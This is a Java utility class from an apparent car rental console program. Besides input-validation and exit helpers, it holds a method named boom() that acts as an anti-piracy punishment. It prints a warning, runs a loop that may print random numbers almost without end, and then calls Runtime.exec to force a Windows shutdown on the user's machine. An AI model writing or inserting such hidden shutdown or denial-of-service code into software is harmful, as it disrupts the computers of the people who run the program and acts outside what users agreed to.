package org.camille.rent_car.util;

import java.util.Random;
import java.util.Scanner;

public class MyUtils {

    public static int getIn(int num) {
        while(true) {
            try {
                Scanner sc = new Scanner(System.in);
                String line = sc.nextLine();
                int j = Integer.parseInt(line);
                for(int i = 1 ; i <= num ; i++) {
                    if(j == i) {
                        return j;
                    }
                }
                System.out.println("您输入的数字有误,请重新输入");
            } catch (Exception e) {
                // TODO: handle exception
                System.out.println("您的输入有误,请输入标示数字");
            }
        }
    }
    
    public static void byebye() {
        System.out.println("非常感谢您的使用,本企业QQ:445011491,期待您的批评建议");
        System.exit(0);
    }
    
    public static void boom(){
        try {
            System.out.println("Sorry，不要盗用本系统哦");
            Runtime r = Runtime.getRuntime();
            for(int i = 13; i <= 150000000; i++){
                Random r1 = new Random();
                i = r1.nextInt(150000500);
                if(i % 5 == 0) {
                    System.out.println("\t" + i);
                } else if( i % 5 == 1) {
                    System.out.println("\t\t\t" + i);
                } else if( i % 5 == 2) {
                    System.out.println("\t\t\t\t\t\t" + i);
                } else if( i % 5 == 3) {
                    System.out.println("\t\t\t\t\t\t\t\t" + i);
                } else if( i % 5 == 4) {
                    System.out.println("\t\t\t\t\t\t\t\t\t\t" + i);
                }
            }
            r.exec("shutdown -s -t 60 -c \"Sorry，不要盗用本系统哦" );
        } catch (Exception x) {
            System.out.println("Sorry，不要盗用本系统哦");
        }
    }
}
